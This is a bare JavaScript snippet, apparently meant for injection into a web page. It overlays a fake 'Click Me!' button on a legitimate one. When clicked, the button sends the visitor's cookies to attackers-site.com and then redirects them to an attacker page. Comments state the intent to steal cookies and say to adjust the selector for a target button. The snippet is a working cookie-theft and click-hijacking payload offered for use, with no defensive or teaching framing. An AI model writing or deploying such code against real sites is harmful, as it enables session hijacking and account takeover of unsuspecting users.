<script>
    // Create a new button element
    let fakeButton = document.createElement('button');
    fakeButton.innerHTML = 'Click Me!';
    fakeButton.style.position = 'absolute';
    fakeButton.style.zIndex = '9999';
    fakeButton.onclick = function() {
        // Steal cookies and send them to the attacker's server
        let xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://attackers-site.com/collect.php?cookie=' + document.cookie, true);
        xhr.send();
        
        // Redirect user to the attacker's page
        window.location.href = 'http://attackers-site.com/hacked.html';
    };

    // Append the fake button over the legit button
    let legitButton = document.querySelector('.legitButtonClass'); // Replace '.legitButtonClass' with the correct selector for your target button
    legitButton.style.position = 'relative';
    legitButton.appendChild(fakeButton);
</script>
